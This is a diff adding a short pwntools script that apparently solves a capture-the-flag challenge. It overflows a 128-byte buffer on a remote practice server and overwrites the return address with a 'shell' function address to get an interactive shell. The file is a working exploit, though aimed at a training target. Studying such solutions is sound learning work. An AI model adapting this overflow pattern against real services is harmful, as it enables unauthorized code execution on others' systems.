@@ -1,0 +1,16 @@
+from pwn import *
+
+
+
+r = remote("ctf.j0n9hyun.xyz", 3001)
+
+
+shell = 0x0804849b
+
+payload  = b""
+payload += b"a" * 128
+payload += p32(shell)
+
+r.sendline(payload)
+
+r.interactive()
